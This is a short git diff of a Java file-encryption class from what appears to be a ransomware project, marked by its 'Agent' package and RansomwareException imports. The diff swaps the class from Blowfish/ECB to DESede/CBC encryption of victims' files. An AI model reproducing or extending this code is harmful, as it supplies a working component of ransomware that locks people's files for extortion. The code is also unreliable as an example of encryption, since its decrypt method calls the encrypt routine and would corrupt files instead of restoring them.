@@ -8,13 +8,13 @@ import javax.crypto.SecretKey;
 import Agent.exceptions.CryptoException;
 import Agent.exceptions.RansomwareException;
 
-public class Blowfish   implements CryptoInterface {
+public class DESede  implements CryptoInterface {
 
 	@Override
-	public void encrypt(SecretKey skey, File fileToEncrypt)  throws RansomwareException, GeneralSecurityException {
+	public void encrypt(SecretKey skey, File fileToEncrypt)  throws RansomwareException, GeneralSecurityException{
 
 		try {
-			JavaCryptoUtil.encrypt(skey, fileToEncrypt, "Blowfish/ECB/PKCS5Padding");
+			JavaCryptoUtil.encrypt(skey, fileToEncrypt,  "DESede/CBC/PKCS5Padding");
 		} catch (CryptoException e) {
 			throw new CryptoException("problem with encrypting", e.getCause());
 		}
@@ -25,11 +25,10 @@ public class Blowfish   implements CryptoInterface {
 	public void decrypt(SecretKey skey, File fileToDecrypt) throws RansomwareException, GeneralSecurityException {
 
 		try {
-			JavaCryptoUtil.encrypt(skey, fileToDecrypt, "Blowfish/ECB/PKCS5Padding");
+			JavaCryptoUtil.encrypt(skey, fileToDecrypt, "DESede/CBC/PKCS5Padding");
 		} catch (CryptoException e) {
 			throw new CryptoException("problem with decrypting", e.getCause());
 		}
 	}
 
 }
-
